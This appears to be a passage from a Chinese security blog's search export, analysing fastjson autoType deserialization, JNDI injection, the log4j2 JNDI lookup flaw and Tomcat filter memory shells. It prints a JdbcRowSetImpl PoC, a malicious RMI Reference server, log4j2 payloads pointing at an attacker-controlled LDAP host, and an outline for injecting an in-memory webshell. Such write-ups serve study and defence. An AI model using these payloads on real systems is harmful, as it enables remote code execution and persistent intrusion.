class="line">调用了getName</span><br><span class="line">调用了getAge</span><br><span class="line">调用了getName</span><br><span class="line">str1: &#123;<span class="string">&quot;age&quot;</span>:<span class="number">23</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;jax&quot;</span>&#125;</span><br><span class="line">str2: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;typeDemo.User&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">23</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;jax&quot;</span>&#125;</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"><span class="meta">@type</span>: com.alibaba.fastjson.JSONObject</span><br><span class="line">str1<span class="string">&#x27;s parse1: &#123;&quot;name&quot;:&quot;jax&quot;,&quot;age&quot;:23&#125;</span></span><br><span class="line"><span class="string">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="string">调用了setAge</span></span><br><span class="line"><span class="string">调用了setName</span></span><br><span class="line"><span class="string">@type: typeDemo.User</span></span><br><span class="line"><span class="string">str2&#x27;</span>s parse2: User&#123;name=<span class="string">&#x27;jax&#x27;</span>, age=<span class="number">23</span>&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码运行，查看输出结果，在指定JSONObject.toJSONString()指定SerializerFeature.WriteClassName时，会多出一个@type。在解析成对象时，没有@type属性的对象是JSONObject类型，有@type对象的是User类型，那么可以知道@type 是用于在解析 JSON 时指定类的。</p>
<p><strong>在JSON.parse(str2)时，会自动调用User类的setter方法</strong>,通过对源码进行分析，在fastjson反序列化过程中需要满足如下条件的setter方法才能被自动调用</p>
<ol>
<li>方法名长度不能小于4</li>
<li>不能是静态方法</li>
<li>返回的类型必须是void 或者是自己本身</li>
<li>传入参数个数必须为1</li>
<li>方法开头必须是set</li>
</ol>
<h2 id="JdbcRowSetImpl链分析"><a href="#JdbcRowSetImpl链分析" class="headerlink" title="JdbcRowSetImpl链分析"></a>JdbcRowSetImpl链分析</h2><p>使用jndi注入工具启动ldap服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;calc.exe&quot;</span> -A <span class="string">&quot;127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/mms7ju\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为调试过程太长，只在几个关键位置打断点</p>
<p>在JSON.parse(payload)处打断点，跟进parse方法</p>
<p>跟进下一个断点DefaultJSONParser#DefaultJSONParser(),</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                    String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    			   <span class="comment">// 这步骤实现通过@type获取要对com.sun.rowset.JdbcRowSetImpl类进行反序列化</span></span><br><span class="line">                    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 进行反序列化操作</span></span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>因为payload中设置了dataSourceName和autoCommit键，对JdbcRowSetImpl对象进行反序列化时会自动调用</p>
<p>setDataSourceName()和setAutoCommit,因为这两个方法名都满足上述反序列化过程可以被自动调用的setter方法的五个要求</p>
<p>后续跟进到JdbcRowSetImpl#setDataSourceName(),对传入的dataSourceName进行赋值操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">                <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">                <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 设置payload中的dataSourceName值</span></span><br><span class="line">            <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进断点JdbcRowSetImpl#setAutoCommit()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="comment">// 跟进connect()</span></span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进跟进connect()，因为getDataSourceName()获取的值是可控的，对应传入的恶意payload中的dataSourceName值，所以这里的lookup处存在jdni注入，断点放行后，可以弹出计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//此处使用jndi</span></span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            <span class="comment">// 因为getDataSourceName()获取的值是可控的，对应传入的恶意payload中的dataSourceName值，所以这里的lookup处存在jdni注入</span></span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入</title>
    <url>/2021/10/03/jndi%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="什么是-JNDI"><a href="#什么是-JNDI" class="headerlink" title="什么是 JNDI"></a>什么是 JNDI</h2><p>简单来说，JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI</p>
<p>总之就是，可以通过JNDI接口查找指定名称对应的东西。</p>
<h2 id="Reference含义："><a href="#Reference含义：" class="headerlink" title="Reference含义："></a>Reference含义：</h2><p>引用由Reference类表示，并且由地址和有关被引用对象的类信息组成，每个地址都包含有关如何构造对象。</p>
<p>Reference可以使用工厂来构造对象。当使用lookup查找对象时，Reference将使用工厂提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Reference类</span></span><br><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;FactoryClassName&quot;</span>, <span class="string">&quot;http://xxx.com:12345/&quot;</span>);<span class="comment">//refClassName为类名加上包名，FactoryClassName为工厂类名并且包含工厂类的包名</span></span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>

<p>当有客户端通过 lookup(“refObj”)获取远程对象时，获得到一个 Reference类的存根，由于获取的是一个 Reference类的实例，客户端会首先去本地的 CLASSPATH去寻找被标识为 refClassName的类，如果本地未找到，则会去请求 <a href="http://xxx.com:12345/FactoryClassName.class">http://xxx.com:12345/FactoryClassName.class</a> 加载工厂类。</p>
<h2 id="JNDI注入攻击过程"><a href="#JNDI注入攻击过程" class="headerlink" title="JNDI注入攻击过程"></a>JNDI注入攻击过程</h2><ol>
<li>RMI服务端获取HTTP服务上的引用对象，利用 ReferenceWrapper 包装之后绑定在了 Registry 上</li>
<li>JNDI客户端通过指定名称获取RMI服务端的引用对象</li>
<li>客户端获取到之后利用 getObjectFactoryFromReference 方法对 ReferenceWrapper  stub进行了还原 获取到了 Reference 类</li>
<li>Reference类中的codebase url 远程获取了恶意类并且进行了实例化从而在客户端触发了恶意代码</li>
</ol>
<h2 id="代码案例"><a href="#代码案例" class="headerlink" title="代码案例"></a>代码案例</h2><p>恶意的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建RMI Registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;java RMI registry created. port on 9999...&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建引用对象</span></span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;ExportObject&quot;</span>, <span class="string">&quot;com.longofo.remoteclass.ExportObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 使用ReferenceWrapper类对Reference类或其子类对象进行远程包装使其能够被远程访问，客户端可以访问该引用。</span></span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        <span class="comment">// 绑定引用</span></span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端请求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, NamingException </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">// 获取远程对象</span></span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi://localhost:9999/refObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2 JNDI注入 漏洞分析</title>
    <url>/2021/12/15/log4j2/</url>
    <content><![CDATA[<h1 id="log4j2-jndi注入漏洞分析"><a href="#log4j2-jndi注入漏洞分析" class="headerlink" title="log4j2 jndi注入漏洞分析"></a>log4j2 jndi注入漏洞分析</h1><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://vps_ip:port/vyiqe3&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pom.xml引入2.14.1版本 log4j-core和log4j-api依赖</p>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>因为调用链太长，直接在触发点org.apache.logging.log4j.core.lookup.JndiLookup.lookup()下断点，可看到调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:161, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:740, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:9, log4j</span><br></pre></td></tr></table></figure>

<p>调用链太长，只看几个关键位置</p>
<p>在org.apache.logging.log4j.core.pattern.MessagePatternConverter.format()，for循环里对log的message event进行处理，取出${}中的数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (config != <span class="keyword">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">            workingBuilder.setLength(offset);</span><br><span class="line">            workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>org.apache.logging.log4j.core.lookup.Interpolator#lookup()，因为${}中取出的prefix为jndi，所以调用jndiLookup()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> prefixPos = <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">        <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 当前prefix为 jndi</span></span><br><span class="line">            <span class="keyword">final</span> String prefix = <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">            <span class="keyword">final</span> String name = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 根据prefix获取应该具体调用的lookup函数</span></span><br><span class="line">            <span class="keyword">final</span> StrLookup lookup = strLookupMap.get(prefix);</span><br><span class="line">            <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">                ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">            &#125;</span><br><span class="line">            String value = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (lookup != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 实际调用处，跟进</span></span><br><span class="line">                value = event == <span class="keyword">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br></pre></td></tr></table></figure>

<p>跟进org.apache.logging.log4j.core.lookup.JndiLookup#lookup()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> String jndiName = convertJndiName(key);</span><br><span class="line">        <span class="keyword">try</span> (<span class="keyword">final</span> JndiManager jndiManager = JndiManager.getDefaultManager()) &#123;</span><br><span class="line">            <span class="comment">// 触发点</span></span><br><span class="line">            <span class="keyword">return</span> Objects.toString(jndiManager.lookup(jndiName), <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">            LOGGER.warn(LOOKUP, <span class="string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进jndiManager,明显的jndi注入，请求远程的恶意reference获取到本地，触发了漏洞执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public &lt;T&gt; T lookup(final String name) throws NamingException &#123;</span><br><span class="line">        return (T) this.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- java -jar JNDIExploit-1.3-SNAPSHOT.jar -i vps_ip</span><br><span class="line">$&#123;jndi:ldap://vps_ip:port/Basic/Command/Base64/cmd&#125;</span><br><span class="line">$&#123;jndi:ldap:/vps_ip:port/TomcatBypass/Command/Base64/xxx&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <tags>
        <tag>log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat filter 内存马</title>
    <url>/2021/10/05/filter%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="filter生命周期"><a href="#filter生命周期" class="headerlink" title="filter生命周期"></a>filter生命周期</h1><p>filter：自定义filter ，需要实现init()、doFilter、destory()</p>
<ul>
<li>启动服务加载过滤器的实例，调用init方法来初始化filter实例</li>
<li>每次请求经过filter通过 doFilter()处理</li>
<li>停止服务时调用destory方法，销毁实例，所以服务重启会失效</li>
</ul>
<h1 id="tomcat相关知识"><a href="#tomcat相关知识" class="headerlink" title="tomcat相关知识"></a>tomcat相关知识</h1><p>tomcat中有四种类型的servlet容器，分别是Engine、Host、Context、Wrapper，其中重点关注Context</p>
<p>Host：表示一个虚拟主机，例如: a.com</p>
<p>Context：表示一个web应用，<strong>内存马就是注入到Context中</strong></p>
<p>Wrapper：代表一个servlet路由接口</p>
<p>使用request.getServletContext() 获取StandardContext上下文。</p>
<h1 id="动态注册思路"><a href="#动态注册思路" class="headerlink" title="动态注册思路"></a>动态注册思路</h1><p>注入内存马模拟了在web.xml中写filter配置的过程，如果可以把自己创建的FilterMap放在FilterMaps的最前面，urlpattern匹配到的时候，就能把恶意FilterConfig添加到FilterChain中，然后触发shell</p>
<p>通过反射生成恶意filterDefs、filterConfig、filterMaps，三个一起放入Context就起到了web.xml注册一样的效果</p>
<p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，url 等基本信息</p>
<p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p>
<p><strong>FilterMaps</strong>：存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p>
<h1 id="动态创建filter流程"><a href="#动态创建filter流程" class="headerlink" title="动态创建filter流程"></a>动态创建filter流程</h1><p>1、创建filter</p>
<p>2、filterDef对filter进行封装</p>
<p>3、将filterDef添加到filterDefs和filterConfigs中</p>
<p>4、创建新的filterMap将url和filter进行绑定，并添加到filterMaps中</p>
<p>5、将新创建的filter移动到FilterChain的第一位去,每次请求createFilterChain都会根据次动态生成一个过滤链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure>

<p>standardContext找filter相关的配置，先去找filterConfigs—&gt;filterconfig–&gt;具体的filterDef和filterMap</p>
]]></content>
      <tags>
        <tag>filter 内存马</tag>
      </tags>
  </entry>
</search>
